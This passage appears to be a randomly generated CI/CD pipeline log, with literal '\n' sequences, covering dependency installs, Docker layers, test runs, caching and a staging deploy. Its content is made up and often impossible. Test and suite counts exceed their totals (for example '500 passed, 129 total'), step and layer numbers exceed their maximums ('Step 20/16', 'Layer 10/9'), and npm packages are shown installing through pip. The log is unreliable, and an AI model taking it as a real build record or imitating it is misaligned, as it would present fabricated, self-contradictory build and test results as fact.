vulnerabilities\nBuilding Docker image...\nLayer 8/10: RUN command\n[12:20:11] DEBUG: Query executed in 10ms\n[12:20:11] DEBUG: Connection pool: 7 active\nSnapshots: 40 passed, 50 total\nBuilding Docker image...\nOK\nCache invalidated: node_modules\nAlready up to date.\nChecking out develop branch\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nBuilding Docker image...\n\u2713 All checks passed\nOK\n[12:20:11] DEBUG: Loading configuration\nSuccess!\nConnecting to example.com:443...\n[12:20:11] WARN: Deprecated API usage\n[12:20:11] WARN: Deprecated API usage\nSuccess!\nCompleted.\nPulling image: alpine:18\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:20:11] DEBUG: Connection pool: 15 active\nUsing Python 3.11\nConnection established\nUploading artifact 'dist' (2 files)\npip install: Successfully installed webpack-4.14\n[12:20:11] INFO: Connecting to database\npip: Installing build dependencies...\nStep 19/22: Building\nConnection established\n\u2713 All checks passed\nCompiling components/app.ts...\nRan 117 tests in 42s\nTLS handshake completed\nInstalling eslint@2.1.3\nBundling runtime.js\nRan 190 tests in 54s\nCompleted.\n\u2713 All checks passed\nProcessing...\n[12:20:11] DEBUG: Initializing service\nArtifact uploaded: dist.zip (97MB)\nStep 5/22: Installing dependencies\n[12:20:11] DEBUG: Connection pool: 2 active\nMinifying vendor.js\n[12:20:11] WARN: Deprecated API usage\nBundling styles.js\nException: TypeError\nOptimizing 23 modules...\n\u2713 Task completed in 4921ms\nCompleted.\nSwitched to branch 'bugfix/task-590'\n[12:20:11] WARN: Deprecated API usage\nCache restored successfully (100MB)\nUsing Python 3.12\nOK\nTests: 190 passed, 311 total\nFinished.\nStep 20/24: Running migrations\nVerifying...\npip: Installing build dependencies...\nStep 8/21: Installing dependencies\nCreating production build...\nEnvironment: staging\nArtifact downloaded: 19MB\nHEAD is now at 91ff2b0\nnpm install: resolved 1104 packages\nEnvironment: development\nConnection established\nnpm install: added 51 packages\n[12:20:11] INFO: Request completed\nStep 4/23: Running migrations\n  PASS: integration/test_user_create.spec.js\nGET /status - 201 (21ms)\nGET /health - 201 (22ms)\n  PASS: unit/test_auth_login.spec.js\nCompiling components/service.java...\n  PASS: e2e/test_user_create.spec.js\nnpm install: added 178 packages\nProcessing...\nCache restored successfully (419MB)\nGenerating source maps...\n[12:20:11] ERROR: Connection failed\nTime: 64.674s\nException: NullPointerException\nArtifact uploaded: dist.zip (60MB)\nWARNING: jest has known vulnerabilities\nInstalling lodash@3.4.0\npip: Collecting express\n[12:20:11] WARN: Deprecated API usage\nCache miss for key-2890\nReady.\nPOST /data - 200 (52ms)\npip install: Successfully installed axios-4.15\n[12:20:11] WARN: Deprecated API usage\nAlready up to date.\nBundling main.js\nNODE_ENV=production\nCache hit for key-1157\nTransforming 924 files...\n  PASS: unit/test_auth_login.spec.js\nArtifact uploaded: dist.zip (70MB)\nStep 20/16: Linting\n  PASS: test_user_create (381ms)\n\u2713 Step 'test' succeeded\nStep 17/19: Installing dependencies\npip install: Successfully installed lodash-2.7\nWARNING: jest has known vulnerabilities\n[12:20:11] INFO: Cache refreshed\nCompiling lib/handler.rs...\n[12:20:11] DEBUG: Loading configuration\nProcessing...\nnpm install: added 10 packages\nOK\nTest Suites: 48 passed, 17 total\nStep 1/25: Linting\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (38MB)\nMinifying vendor.js\nCache miss for key-5462\nnpm notice: created a lockfile\nRan 83 tests in 39s\nBuilding Docker image...\nTest Suites: 49 passed, 8 total\n[12:20:11] WARN: Deprecated API usage\nOptimizing 12 modules...\n[12:20:11] INFO: Starting build process\n[12:20:11] INFO: Processing request\nOK\n\u2717 build failed with exit code 48\nTime: 118.768s\nPushing to registry...\n[12:20:11] WARN: Deprecated API usage\nWARNING: prettier has known vulnerabilities\nStep 11/20: Running migrations\nCoverage: 81% statements, 88% branches\nGenerating source maps...\nBuilding Docker image...\nCompiling lib/utils.go...\nPlatform: linux-x64\nArtifact uploaded: build.tar.gz (16MB)\nStep 11/22: Running migrations\nMinifying app.js\nCompleted.\nFinished.\n[12:20:11] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:20:11] INFO: Cache refreshed\nFAILED: test_db_connect\nCache saved successfully\nnpm notice: created a lockfile\nUsing Node.js 18.11.4\nCache saved successfully\nCache saved successfully\nSnapshots: 37 passed, 20 total\nGET /health - 204 (68ms)\nOK\n[12:20:11] WARN: Deprecated API usage\nStep 17/15: Linting\n[12:20:11] INFO: Connecting to database\nMinifying app.js\nCache invalidated: build\nArtifact uploaded: dist.zip (26MB)\npip: Installing build dependencies...\nStep 19/17: Testing\n  PASS: test_user_create (224ms)\nStep 2/19: Testing\nCompiling lib/app.ts...\nTest Suites: 21 passed, 21 total\nStep 12/19: Linting\nCreating production build...\nTests: 500 passed, 129 total\nCache miss for key-4997\n\u2713 package completed\nUploading artifact 'dist' (42 files)\nCache invalidated: build\nCompleted.\n[12:20:11] INFO: Cache refreshed\n[12:20:11] WARN: Deprecated API usage\n[12:20:11] DEBUG: Query executed in 81ms\nLayer 10/10: ENV command\n[12:20:11] DEBUG: Memory usage: 1012MB\nEnvironment: test\npip: Collecting prettier\nnpm notice: created a lockfile\nDone.\npip: Collecting jest\n[12:20:11] WARN: Deprecated API usage\nPulling image: alpine:latest\nTransforming 413 files...\nyarn add: Done in 1.51s\nLoading...\nWARNING: eslint has known vulnerabilities\nWARNING: express has known vulnerabilities\nOK\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTransforming 810 files...\nStep 2/21: Installing dependencies\nUsing Node.js 16.7.2\n\u2713 Task completed in 4835ms\nLoading...\nCompiling components/handler.rs...\nyarn add: Done in 5.62s\nnpm install: resolved 533 packages\nLayer 9/13: COPY command\nCreating production build...\n[12:20:11] DEBUG: Loading configuration\n=== Step e2e_tests completed ===\n=== Step: type_check ===\nMinifying app.js\nSwitched to branch 'bugfix/task-107'\nInstalling webpack@4.3.2\n[12:20:11] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (61MB)\nArtifact downloaded: 25MB\nProcessing...\nCache hit for key-6755\nWARNING: react has known vulnerabilities\nNODE_ENV=test\nCompleted.\nStep 9/18: Installing dependencies\n[12:20:11] DEBUG: Connection pool: 20 active\nSnapshots: 19 passed, 2 total\nPOST /api - 202 (313ms)\nPlatform: win32-x64\nChecking out main branch\nCompleted.\n[12:20:11] DEBUG: Query executed in 53ms\nCoverage: 100% statements, 84% branches\nFinished.\n[12:20:11] DEBUG: Query executed in 79ms\nOptimizing 52 modules...\nStep 15/23: Installing dependencies\nChecking out main branch\nUsing Python 3.10\nCompiling utils/utils.go...\nNODE_ENV=production\n\u2713 All checks passed\n\u2713 Task completed in 682ms\nAlready up to date.\nException: ValueError\n\u2713 Task completed in 2827ms\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 10/22: Building\nDone.\nCompiling src/handler.rs...\nUploading artifact 'build' (25 files)\nGET /status - 204 (57ms)\n\u2713 All checks passed\nUsing Python 3.12\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 All checks passed\nCreating production build...\npip: Collecting jest\nCompiling utils/handler.rs...\nTest Suites: 28 passed, 38 total\nStep 3/15: Installing dependencies\nVerifying...\nCache saved successfully\nNODE_ENV=development\nFetching submodules...\nReady.\n[12:20:11] WARN: Deprecated API usage\nCompiling components/app.ts...\n[12:20:11] DEBUG: Loading configuration\nMinifying app.js\nAlready up to date.\nImage pulled successfully\nCache hit for key-7192\nnpm install: resolved 1303 packages\nCompiling utils/utils.go...\n[12:20:11] INFO: Cache refreshed\nWARNING: prettier has known vulnerabilities\nArtifact uploaded: dist.zip (33MB)\nLayer 4/9: COPY command\npip: Collecting express\nCompiling lib/service.java...\nOptimizing 47 modules...\nCreating production build...\nTransforming 292 files...\nCompiling lib/main.py...\npip: Installing build dependencies...\nStep 15/24: Testing\nPulling image: node:latest\nCompiling components/utils.go...\nStep 10/25: Testing\nEnvironment: staging\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nChecking out master branch\nTLS handshake completed\n[12:20:11] DEBUG: Loading configuration\nArtifact uploaded: build.tar.gz (42MB)\nFetching submodules...\n[12:20:11] WARN: Deprecated API usage\nEnvironment: development\nUploading artifact 'coverage' (19 files)\nLayer 2/13: COPY command\n  PASS: integration/test_user_create.spec.js\nPushing to registry...\nHEAD is now at 3580bb1\n[12:20:11] DEBUG: Initializing service\nnpm notice: package.json updated\nPOST /data - 202 (399ms)\nTime: 70.529s\nOK\nCache saved successfully\n\u2713 All checks passed\nRan 55 tests in 46s\n[12:20:11] INFO: Cache refreshed\n[12:20:11] DEBUG: Loading configuration\n[12:20:11] INFO: Starting build process\nCache restored successfully (313MB)\nMinifying main.js\nStep 17/16: Installing dependencies\nnpm install: added 151 packages\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nLayer 7/13: COPY command\nWARNING: webpack has known vulnerabilities\nProcessing...\nPulling image: python:latest\nTest Suites: 39 passed, 39 total\nFetching submodules...\nStep 14/21: Installing dependencies\nDone.\n[12:20:11] INFO: Processing request\nBuilding Docker image...\n\u2713 Task completed in 2267ms\nCache hit for key-7860\n[12:20:11] DEBUG: Memory usage: 1170MB\nAlready up to date.\n[12:20:11] DEBUG: Loading configuration\nStep 14/21: Running migrations\n\u2713 All checks passed\nStep 8/25: Building\nSwitched to branch 'bugfix/task-746'\nBundling main.js\nCache restored successfully (450MB)\nLayer 10/9: ENV command\nCache invalidated: dependencies\nTime: 111.688s\n[12:20:11] INFO: Processing request\nCache invalidated: build\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nOptimizing 65 modules...\nEnvironment: development\n[12:20:11] INFO: Starting build process\nConnection established\nUsing Python 3.11\nLayer 1/10: ENV command\npip: Installing build dependencies...\nyarn add: Done in 30.95s\nCache hit for key-1656\n\u2713 Task completed in 4887ms\npip install: Successfully installed axios-2.15\nStep 4/23: Linting\n[12:20:11] INFO: Starting build process\nUploading artifact 'build' (11 files)\nReady.\nBuilding Docker image...\n[12:20:11] DEBUG: Memory usage: 1818MB\nInstalling axios@4.20.10\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTransforming 205 files...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling lib/utils.go...\nMinifying app.js\nArtifact uploaded: dist.zip (87MB)\nTLS handshake completed\nGET /api - 204 (78ms)\nCompiling components/handler.rs...\nStep 7/16: Deploying\nStep 17/23: Building\n[12:20:11] INFO: Request completed\n[12:20:11] WARN: Deprecated API usage\n[12:20:11] DEBUG: Query executed in 76ms\n[12:20:11] INFO: Starting build process\n[12:20:11] DEBUG: Connection pool: 6 active\nUsing Python 3.11\nCache hit for key-3578\n[12:20:11] INFO: Request completed\nFetching submodules...\n[12:20:11] INFO: Starting build process\nRan 40 tests in 1s\nCompiling lib/index.js...\nTest Suites: 16 passed, 10 total\nStep 9/19: Installing dependencies\nStep 4/16: Installing dependencies\nWARNING: express has known vulnerabilities\n\u2713 Step 'build' succeeded\n[12:20:11] INFO: Processing request\nBundling runtime.css\n[12:20:11] WARN: Deprecated API usage\nBundling main.css\nCompleted.\npip install: Successfully installed react-5.20\npip: Installing build dependencies...\nLayer 2/15: COPY command\nArtifact uploaded: build.tar.gz (34MB)\nStep 16/17: Running migrations\nDone.\n\u2717 build failed with exit code 11\nStep 8/21: Building\nReady.\npip: Collecting lodash\nUsing Node.js 19.9.8\nPlatform: win32-x64\nArtifact uploaded: dist.zip (58MB)\nWaiting...\nArtifact downloaded: 5MB\nAlready up to date.\nyarn add: Done in 7.22s\nCompiling utils/app.ts...\nStep 1/17: Deploying\nWaiting...\nCache restored successfully (242MB)\nCache invalidated: node_modules\nWaiting...\nUsing Node.js 14.4.6\nCache restored successfully (117MB)\nNODE_ENV=test\nBundling main.css\nOK\npip: Collecting lodash\n[12:20:11] INFO: Request completed\nSwitched to branch 'feature/task-524'\nArtifact uploaded: build.tar.gz (6MB)\nPulling image: alpine:latest\npip: Downloading express-5.13.tar.gz\nTest Suites: 40 passed, 13 total\n  PASS: test_cache_hit (291ms)\nGenerating source maps...\nOK\nInstalling axios@2.6.5\npip: Downloading express-4.6.tar.gz\npip: Downloading lodash-1.0.tar.gz\nConnecting to example.com:443...\nCompiling utils/app.ts...\n[12:20:11] WARN: Deprecated API usage\nPlatform: darwin-arm64\n[12:20:11] WARN: Deprecated API usage\npip: Installing build dependencies...\nPlatform: win32-x64\nCache restored successfully (491MB)\nPlatform: darwin-arm64\nBundling styles.js\nFetching submodules...\nStep 3/23: Installing dependencies\nDone.\n[12:20:11] DEBUG: Loading configuration\nTransforming 721 files...\nTransforming 127 files...\n[12:20:11] INFO: Cache refreshed\nAlready up to date.\n\u2713 Task completed in 2036ms\n[12:20:11] WARN: Deprecated API usage\nTransforming 514 files...\nNODE_ENV=test\nCache miss for key-5974\nnpm notice: package.json updated\nWARNING: lodash has known vulnerabilities\nPulling image: python:latest\n\u2713 Task completed in 2283ms\n=== Step type_check completed ===\n=== Step: install_dependencies ===\nCompiling lib/main.py...\nnpm notice: created a lockfile\nImage pulled successfully\nCompiling utils/service.java...\nCache hit for key-7819\nTLS handshake completed\nCompiling components/utils.go...\nUsing Python 3.11\nFinished.\nProcessing...\nFinished.\nRan 104 tests in 26s\nUsing Node.js 16.16.1\nStep 15/23: Linting\n\u2713 Step 'checkout' succeeded\n[12:20:11] DEBUG: Connection pool: 18 active\n  PASS: test_user_create (160ms)\nCompiling components/service.java...\nnpm notice: created a lockfile\nWARNING: lodash has known vulnerabilities\nUploading artifact 'coverage' (7 files)\nRan 91 tests in 7s\n  PASS: test_cache_hit (457ms)\nArtifact downloaded: 20MB\nCompiling utils/handler.rs...\n[12:20:11] INFO: Processing request\n[12:20:11] ERROR: Connection failed\nChecking out master branch\npip: Installing build dependencies...\nUsing Node.js 14.7.10\nAlready up to date.\nReady.\nConnection established\nTransforming 617 files...\n[12:20:11] DEBUG: Query executed in 88ms\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 19/18: Testing\nUploading artifact 'coverage' (2 files)\nPlatform: win32-x64\nLayer 1/9: RUN command\npip install: Successfully installed react-3.6\nStep 10/20: Running migrations\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:20:11] DEBUG: Connection pool: 19 active\n[12:20:11] INFO: Starting build process\n[12:20:11] DEBUG: Memory usage: 532MB\nGenerating source maps...\nStep 13/15: Building\nFinished.\n[12:20:11] DEBUG: Initializing service\npip: Collecting jest\nFetching submodules...\npip: Installing build dependencies...\nCache restored successfully (242MB)\nTests: 133 passed, 377 total\nStep 4/15: Installing dependencies\npip: Collecting webpack\nRan 15 tests in 54s\n[12:20:11] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nHEAD is now at cb7e409\n[12:20:11] INFO: Connecting to database\nEnvironment: staging\nNODE_ENV=production\nConnecting to test.io:443...\n[12:20:11] DEBUG: Loading configuration\nStep 10/25: Installing dependencies\nRan 141 tests in 24s\nArtifact uploaded: dist.zip (4MB)\nnpm notice: package.json updated\nCompiling src/main.py...\nGET /status - 201 (13ms)\nConnection established\nBuilding Docker image...\npip: Installing build dependencies...\nPulling image: python:latest\nCache saved successfully\nStep 2/21: Installing dependencies\nTests: 142 passed, 68 total\nLoading...\n[12:20:11] ERROR: Connection failed\nCoverage: 75% statements, 89% branches\nnpm notice: created a lockfile\nTests: 304 passed, 146 total\nStep 16/21: Testing\nLoading...\nCompiling utils/utils.go...\nCache miss for key-3961\nCache restored successfully (397MB)\nCache invalidated: build\nCreating production build...\nMinifying app.js\nStep 17/15: Building\n[12:20:11] DEBUG: Connection pool: 12 active\nMinifying main.js\nUsing Python 3.9\nStep 17/21: Building\nCompiling lib/utils.go...\nLayer 2/8: COPY command\npip: Collecting react\nReady.\nnpm notice: created a lockfile\nChecking out main branch\nStep 11/21: Running migrations\nTransforming 865 files...\nLayer 6/14: RUN command\nConnecting to cloud.services:443...\nBundling runtime.js\nAlready up to date.\nStep 3/22: Deploying\nCache miss for key-3510\nConnecting to startup.dev:443...\n[12:20:11] DEBUG: Memory usage: 1534MB\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nLoading...\nReady.\nWARNING: webpack has known vulnerabilities\nnpm notice: created a lockfile\nImage pulled successfully\nImage pulled successfully\n[12:20:11] ERROR: Connection failed\nCache restored successfully (442MB)\nPulling image: alpine:18\nCache restored successfully (280MB)\nArtifact uploaded: dist.zip (11MB)\nBundling runtime.css\nCache miss for key-1125\npip: Collecting jest\n[12:20:11] DEBUG: Memory usage: 1148MB\nImage pulled successfully\nUsing Python 3.10\n[12:20:11] DEBUG: Connection pool: 9 active\n[12:20:11] DEBUG: Connection pool: 8 active\nCache invalidated: build\nnpm notice: created a lockfile\nStep 1/18: Linting\nnpm install: added 161 packages\n[12:20:11] ERROR: Connection failed\nReady.\n[12:20:11] DEBUG: Loading configuration\n[12:20:11] INFO: Request completed\nPlatform: linux-x64\n[12:20:11] ERROR: Connection failed\nVerifying...\n[12:20:11] DEBUG: Query executed in 42ms\n  PASS: test_auth_login (141ms)\nPlatform: darwin-arm64\nHEAD is now at c5731d1\nBundling vendor.js\nVerifying...\nConnection established\n\u2713 Task completed in 2839ms\nTransforming 209 files...\nCompiling lib/handler.rs...\nArtifact uploaded: build.tar.gz (6MB)\nCache miss for key-7608\nTests: 151 passed, 286 total\npip: Collecting axios\nWaiting...\n[12:20:11] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:20:11] WARN: Deprecated API usage\nInstalling axios@4.11.9\npip: Downloading express-5.11.tar.gz\nFinished.\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:20:11] WARN: Deprecated API usage\nPulling image: python:3.11\n  PASS: e2e/test_api_health.spec.js\nUsing Node.js 16.4.7\nLayer 6/14: RUN command\nStep 1/21: Running migrations\n[12:20:11] INFO: Request completed\nCreating production build...\nGET /status - 200 (72ms)\n\u2713 Task completed in 1554ms\nBundling vendor.css\npip: Collecting eslint\npip: Installing build dependencies...\n[12:20:11] INFO: Starting build process\n[12:20:11] WARN: Deprecated API usage\npip install: Successfully installed express-3.12\nConnection established\nOK\nPOST /upload - 200 (122ms)\nCreating production build...\nOptimizing 56 modules...\nStep 20/19: Installing dependencies\nCompiling lib/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nnpm notice: package.json updated\nCache saved successfully\nCompiling src/app.ts...\nStep 1/18: Deploying\n[12:20:11] DEBUG: Connection pool: 5 active\n[12:20:11] ERROR: Connection failed\n[12:20:11] INFO: Starting build process\nSuccess!\nUsing Python 3.10\nLayer 6/14: COPY command\n[12:20:11] INFO: Starting build process\nReady.\nCache invalidated: node_modules\nStep 19/19: Running migrations\nTransforming 232 files...\nPOST /api - 200 (151ms)\n[12:20:11] WARN: Deprecated API usage\nEnvironment: test\nImage pulled successfully\nArtifact uploaded: dist.zip (45MB)\nCompiling utils/utils.go...\nBuilding Docker image...\n\u2713 All checks passed\n[12:20:11] INFO: Starting build process\nGET /api - 200 (89ms)\nPOST /upload - 200 (426ms)\nInstalling lodash@2.1.9\nCache hit for key-1365\n[12:20:11] INFO: Processing request\nSwitched to branch 'bugfix/task-792'\nSuccess!\nConnection established\npip: Installing build dependencies...\npip: Downloading react-1.0.tar.gz\nCache restored successfully (244MB)\nChecking out main branch\npip: Downloading express-1.14.tar.gz\nTransforming 296 files...\nPOST /data - 202 (406ms)\npip: Installing build dependencies...\nCreating production build...\n[12:20:11] INFO: Processing request\nCache restored successfully (45MB)\nCompiling src/utils.go...\n[12:20:11] DEBUG: Query executed in 4ms\nyarn add: Done in 9.78s\n\u2713 deploy completed\nFAILED: test_api_health\n[12:20:11] INFO: Starting build process\nArtifact uploaded: build.tar.gz (42MB)\nOK\nCache invalidated: node_modules\n\u2713 Step 'build' succeeded\nUsing Python 3.12\nRan 74 tests in 19s\nUploading artifact 'dist' (36 files)\nCache miss for key-7708\nCompiling utils/app.ts...\nArtifact uploaded: dist.zip (29MB)\npip: Installing build dependencies...\n\u2713 Step 'checkout' succeeded\n=== Step install_dependencies completed ===\n=== Step: setup_environment ===\nLayer 7/11: COPY command\nWARNING: axios has known vulnerabilities\nConnection established\nCache hit for key-1771\n\u2713 All checks passed\nFetching submodules...\nWARNING: jest has known vulnerabilities\n\u2717 build failed with exit code 23\n\u2713 All checks passed\nBuilding Docker image...\nCreating production build...\n[12:20:11] INFO: Cache refreshed\nFetching submodules...\nCompiling components/main.py...\nCompiling lib/service.java...\nUploading artifact 'coverage' (18 files)\nStep 4/24: Linting\nCompleted.\nPOST /data - 201 (349ms)\nCache miss for key-9477\nMinifying app.js\n[12:20:11] WARN: Deprecated API usage\n[12:20:11] ERROR: Connection failed\nStep 17/25: Testing\n\u2713 Step 'build' succeeded\nMinifying vendor.js\nCache restored successfully (454MB)\n[12:20:11] WARN: Deprecated API usage\nConnecting to startup.dev:443...\nVerifying...\nCache saved successfully\nCache restored successfully (344MB)\n\u2713 All checks passed\n  PASS: unit/test_auth_login.spec.js\n[12:20:11] INFO: Cache refreshed\n  PASS: integration/test_cache_hit.spec.js\nnpm install: resolved 1810 packages\nnpm notice: package.json updated\nBuilding Docker image...\nCompleted.\nSnapshots: 11 passed, 21 total\nFinished.\nUploading artifact 'build' (42 files)\nTransforming 938 files...\nStep 3/25: Running migrations\n[12:20:11] INFO: Cache refreshed\nTests: 116 passed, 218 total\nyarn add: Done in 28.72s\nnpm install: added 27 packages\nGET /health - 204 (25ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nSuccess!\nTests: 97 passed, 228 total\n[12:20:11] WARN: Deprecated API usage\n[12:20:11] DEBUG: Query executed in 36ms\nConnection established\n[12:20:11] DEBUG: Query executed in 11ms\nReady.\nOptimizing 35 modules...\n[12:20:11] DEBUG: Query executed in 67ms\n[12:20:11] DEBUG: Query executed in 41ms\nArtifact downloaded: 15MB\nPushing to registry...\nStep 13/21: Testing\nHEAD is now at 5a26465\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPlatform: win32-x64\n[12:20:11] ERROR: Connection failed\nTransforming 332 files...\n  PASS: test_user_create (97ms)\n\u2713 deploy completed\nCompiling src/index.js...\nSnapshots: 26 passed, 9 total\n[12:20:11] INFO: Processing request\nHEAD is now at c993e7a\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nSnapshots: 43 passed, 27 total\nInstalling prettier@3.6.3\nTests: 269 passed, 165 total\nWARNING: eslint has known vulnerabilities\nDone.\nLayer 10/12: ENV command\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (44MB)\nStep 12/21: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:20:11] DEBUG: Memory usage: 383MB\n[12:20:11] DEBUG: Memory usage: 1308MB\nFetching submodules...\nSuccess!\nLayer 3/13: RUN command\n[12:20:11] DEBUG: Query executed in 92ms\n\u2713 All checks passed\nStep 1/19: Running migrations\nGenerating source maps...\n  PASS: test_user_create (115ms)\nGenerating source maps...\nWaiting...\n[12:20:11] INFO: Starting build process\nCache miss for key-6161\npip: Installing build dependencies...\nMinifying vendor.js\nFAILED: test_cache_hit\nTransforming 791 files...\n[12:20:11] INFO: Request completed\nVerifying...\nUploading artifact 'dist' (15 files)\nTransforming 200 files...\nFinished.\n[12:20:11] DEBUG: Loading configuration\nInstalling jest@4.4.0\nStep 4/18: Linting\nTransforming 915 files...\nUsing Python 3.12\n[12:20:11] WARN: Deprecated API usage\nStep 19/24: Installing dependencies\nFetching submodules...\nProcessing...\n\u2713 Step 'test' succeeded\nTLS handshake completed\n[12:20:11] INFO: Connecting to database\nLoading...\nMinifying app.js\nyarn add: Done in 5.24s\n\u2713 Task completed in 406ms\nConnecting to cloud.services:443...\nPushing to registry...\nConnection established\nGenerating source maps...\n\u2713 Task completed in 3807ms\n[12:20:11] INFO: Cache refreshed\nAlready up to date.\nArtifact uploaded: dist.zip (79MB)\n\u2717 build failed with exit code 118\nStep 19/19: Testing\nUsing Node.js 18.7.7\nTests: 133 passed, 450 total\nUsing Python 3.10\nCache hit for key-4523\nStep 16/23: Building\nSnapshots: 21 passed, 15 total\nArtifact downloaded: 6MB\nCreating production build...\nTests: 451 passed, 350 total\nTransforming 893 files...\nOptimizing 31 modules...\n[12:20:11] WARN: Deprecated API usage\nWARNING: jest has known vulnerabilities\n  PASS: test_user_create (318ms)\nChecking out develop branch\nStep 7/20: Testing\nGET /status - 200 (58ms)\nWARNING: eslint has known vulnerabilities\nGenerating source maps...\nOptimizing 51 modules...\nWARNING: react has known vulnerabilities\nStep 2/25: Building\nCache hit for key-5948\nNODE_ENV=production\nUploading artifact 'dist' (8 files)\nnpm install: added 88 packages\n[12:20:11] INFO: Processing request\nWARNING: prettier has known vulnerabilities\nLayer 9/10: RUN command\n\u2713 Step 'install' succeeded\n  PASS: test_auth_login (183ms)\nUsing Node.js 18.5.8\n[12:20:11] WARN: Deprecated API usage\nChecking out main branch\nArtifact uploaded: dist.zip (15MB)\nCreating production build...\nCompiling components/utils.go...\nCache hit for key-8597\n\u2713 All checks passed\nAlready up to date.\n[12:20:11] INFO: Connecting to database\nnpm notice: package.json updated\nCache invalidated: node_modules\nCompiling components/app.ts...\nOK\npip: Collecting prettier\nTime: 1.715s\nFinished.\nMinifying app.js\nnpm notice: created a lockfile\nArtifact downloaded: 11MB\nFinished.\nCompiling components/utils.go...\n  PASS: unit/test_auth_login.spec.js\nCompleted.\nDone.\n\u2713 Step 'build' succeeded\nLoading...\n[12:20:11] WARN: Deprecated API usage\nPushing to registry...\npip: Installing build dependencies...\n[12:20:11] WARN: Deprecated API usage\n\u2713 Step 'install' succeeded\nCache invalidated: dependencies\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nFetching submodules...\nSuccess!\nReady.\nProcessing...\n[12:20:11] INFO: Processing request\nGenerating source maps...\nCache hit for key-2468\nFinished.\nStep 9/24: Deploying\nMinifying main.js\nPushing to registry...\nWARNING: express has known vulnerabilities\nArtifact uploaded: build.tar.gz (1MB)\nCache restored successfully (371MB)\n\u2717 build failed with exit code 106\nCompiling utils/main.py...\nCache hit for key-1978\n  PASS: test_db_connect (311ms)\nPOST /upload - 202 (450ms)\nLoading...\n[12:20:11] WARN: Deprecated API usage\nOptimizing 55 modules...\nWARNING: lodash has known vulnerabilities\nWARNING: jest has known vulnerabilities\nPlatform: linux-x64\nWARNING: webpack has known vulnerabilities\nLoading...\nnpm install: added 59 packages\nCache restored successfully (496MB)\nCache hit for key-4646\n[12:20:11] DEBUG: Memory usage: 641MB\nConnecting to startup.dev:443...\nUsing Node.js 15.2.2\nTests: 229 passed, 76 total\nTLS handshake completed\nTests: 443 passed, 141 total\n\u2713 Task completed in 1252ms\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 16/20: Linting\n  PASS: test_api_health (108ms)\nFinished.\n[12:20:11] DEBUG: Initializing service\n[12:20:11] DEBUG: Connection pool: 16 active\nStep 17/15: Running migrations\nTransforming 106 files...\nSuccess!\nChecking out main branch\n[12:20:11] INFO: Request completed\nReady.\nOptimizing 48 modules...\n  PASS: unit/test_user_create.spec.js\nHEAD is now at 794b257\n=== Step setup_environment completed ===\n=== Step: deploy_staging ===\n[12:20:11] DEBUG: Loading configuration\nNODE_ENV=production\nSwitched to branch 'feature/task-862'\nCache invalidated: dependencies\nConnection established\nAlready up to date.\nBuilding Docker image...\nWARNING: eslint has known vulnerabilities\n[12:20:11] INFO: Processing request\nTime: 115.530s\nFinished.\n  PASS: test_auth_login (209ms)\nVerifying...\nRan 23 tests in 44s\nCache hit for key-7752\nCompleted.\nConnection established\nLayer 6/12: ENV command\nOptimizing 12 modules...\nCoverage: 73% statements, 80% branches\nEnvironment: staging\nProcessing...\nStep 15/16: Running migrations\nyarn add: Done in 26.97s\nCompiling src/app.ts...\n\u2713 Task completed in 1813ms\nSnapshots: 24 passed, 50 total\nNODE_ENV=test\nLoading...\nLayer 4/10: ENV command\nMinifying app.js\nRan 43 tests in 48s\nCache hit for key-9266\nSnapshots: 40 passed, 6 total\nCompiling src/index.js...\nSwitched to branch 'bugfix/task-377'\n[12:20:11] DEBUG: Query executed in 76ms\nLoading...\n  PASS: integration/test_api_health.spec.js\nConnection established\n[12:20:11] DEBUG: Loading configuration\nAlready up to date.\nConnecting to startup.dev:443...\nStep 17/22: Linting\nnpm notice: package.json updated\n[12:20:11] INFO: Connecting to database\n[12:20:11] DEBUG: Initializing service\nCompleted.\nReady.\n  PASS: test_api_health (283ms)\nEnvironment: production\npip install: Successfully installed webpack-3.5\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/handler.rs...\nNODE_ENV=test\n[12:20:11] DEBUG: Query executed in 12ms\nHEAD is now at 4567d41\nUploading artifact 'build' (34 files)\n[12:20:11] INFO: Cache refreshed\nStep 13/22: Testing\nFetching submodules...\nTLS handshake completed\nCompiling components/utils.go...\nCache miss for key-5565\n\u2717 build failed with exit code 23\nCompiling lib/handler.rs...\nConnection established\n[12:20:11] DEBUG: Connection pool: 7 active\nHEAD is now at aaf24eb\nCompiling utils/main.py...\n\u2713 Task completed in 3426ms\n[12:20:11] INFO: Processing request\n\u2713 All checks passed\nInstalling prettier@3.5.8\nPushing to registry...\nSuccess!\nAlready up to date.\nWARNING: lodash has known vulnerabilities\nTime: 52.549s\nRan 140 tests in 32s\n[12:20:11] INFO: Request completed\nTest Suites: 42 passed, 32 total\n[12:20:11] INFO: Request completed\n  PASS: test_cache_hit (344ms)\n[12:20:11] DEBUG: Memory usage: 1506MB\nCompiling lib/utils.go...\nConnection established\nCache invalidated: node_modules\nCreating production build...\nHEAD is now at 